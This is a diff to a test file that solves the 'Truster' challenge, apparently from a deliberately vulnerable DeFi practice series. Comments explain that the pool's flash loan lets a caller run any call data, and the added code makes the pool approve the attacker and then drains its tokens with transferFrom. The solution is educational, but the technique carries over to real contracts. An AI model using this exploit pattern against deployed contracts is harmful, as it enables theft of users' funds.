@@ -27,8 +27,29 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
+
+    //The contract has no requires for the borrowAmount this allow a zero value
+    //The contract has no requires for the target address - as long as the target is a contract is ok
+    //The contract has no requires to prevent actions from the arbitrary encoded data
+    //Based on that we can use the DVT tokens, the TrusterLenderPool is the msg.sender in the call,
+    //passing the data as an encoded approve function, granting approval to the attacker address
+    //After that, the attacker can use the transferFrom function to transfer ALL the DVT tokens from the pool
+    //DONE
+
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const poolBalance = await this.token.balanceOf(this.pool.address)
+        
+        let ABI = [
+            "function approve(address to, uint256 amount)"
+        ];
+        let iface = new ethers.utils.Interface(ABI);
+        const _data = iface.encodeFunctionData("approve", [ attacker.address, poolBalance ])
+        
+        await this.pool.flashLoan(0, attacker.address, this.token.address, _data )
+        
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, poolBalance)
+        
     });
 
     after(async function () {
